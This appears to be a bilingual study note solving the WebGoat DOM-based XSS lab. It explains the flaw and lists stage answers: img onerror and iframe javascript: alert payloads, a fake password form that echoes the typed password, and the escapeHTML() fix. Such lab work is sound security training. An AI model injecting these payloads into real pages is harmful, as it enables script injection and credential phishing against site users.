# LAB_DOM-Based_cross-site_scripting
## 技术概念或主题（Concept / Topic To Teach）
The Document Object Model (DOM) presents an interesting problem from a security standpoint. It allows the content of a web page to be dynamically modified, but that can be abused by attackers during a malicious code injection. XSS, a type of malicious code injection, can occur when unvalidated user input is used directly to modify the content of a page on the client side. 

文档对象模型（DOM）从安全的角度展现了一个有趣的问题。它允许动态修改网页内容，但是这可以被攻击者用来进行恶意代码注入攻击。XSS，一种恶意代码注入，一般会发生在未经验证的用户的输入直接修改了在客户端的页面内容的情况下。
## 技术原理（How It works）
HTML DOM 实体中可随时插入新的 HTML 语句或 JavaScript 语句，因此很容易被恶意代码利用，从而用来改变页面显示内容或执行恶意代码。

HTML 标记语言中很多标签的特殊属性参数中允许插入 JS 代码，如：IMG/IFRAME 等。
## 总体目标（General Goals）
For this exercise, your mission is to use this vulnerability to inject malicious code into the DOM. Then in the last stage, you will correct the flaws in the code to address the vulnerability. 

在这个练习中，您的任务是利用此漏洞将恶意代码注入到 DOM，然后在最后阶段，通过修改代码来修复这个缺陷，从而解决该漏洞。
## 操作方法（Solutions）
### STAGE 1
![](https://github.com/Anthem9/vnote/raw/master/vnotebook/WebGoat/AJAX_Security/_v_images/_1524707693_10761.png)

* Enter "``<IMG SRC="images/logos/owasp.jpg"/>``" and submit the solution.
### STAGE 2
![](https://github.com/Anthem9/vnote/raw/master/vnotebook/WebGoat/AJAX_Security/_v_images/_1524707764_13125.png)

*  Enter "``<img src=x onerror=;;alert('XSS') />``" and submit the solution.
### STAGE 3
![](https://github.com/Anthem9/vnote/raw/master/vnotebook/WebGoat/AJAX_Security/_v_images/_1524707874_18154.png)

* Enter "``<IFRAME SRC="javascript:alert('XSS');"></IFRAME>``" and submit the solution.
### STAGE 4
![](https://github.com/Anthem9/vnote/raw/master/vnotebook/WebGoat/AJAX_Security/_v_images/_1524708069_20706.png)

*  Enter "``Please enter your password:<BR><input type = "password" name="pass"/><button onClick="javascript:alert('I have your password: ' + pass.value);">Submit</button><BR><BR><BR><BR><BR><BR><BR><BR> <BR><BR><BR><BR><BR><BR><BR><BR>``" and submit the solution.
### STAGE 5
![](https://github.com/Anthem9/vnote/raw/master/vnotebook/WebGoat/AJAX_Security/_v_images/_1524726932_17994.png)
* Modify ``DOMXSS.js``, add ``escapeHTML()`` in ``name``, ie ``escapeHTML(name)``, then save it.
![](https://github.com/Anthem9/vnote/raw/master/vnotebook/WebGoat/AJAX_Security/_v_images/_1524726820_7375.png)


